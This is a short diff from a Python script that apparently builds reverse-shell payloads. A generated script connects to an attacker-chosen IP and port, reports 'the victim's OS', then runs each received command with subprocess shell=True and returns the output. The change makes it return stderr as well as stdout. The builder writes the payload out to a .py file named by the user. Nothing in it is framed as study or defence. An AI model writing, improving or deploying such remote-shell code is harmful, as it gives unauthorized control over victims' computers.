@@ -25,7 +25,7 @@ c.send("the victim's OS is {}".format(os.name).encode())
 while True:
     data = c.recv(4096)
     result = subprocess.run("{}".format(data.decode()),shell=True,capture_output=True)
-    c.send(str(result.stdout.decode()).encode())""".format(ip,port,"{}","{}")
+    c.send("{}\\n{}".format(str(result.stdout.decode()),str(result.stderr.decode())).encode())""".format(ip,port,"{}","{}","{}","{}")
 file_time = input("Enter a file name: ")
 started = True
 lol = open("{}.py".format(file_time),"a+")
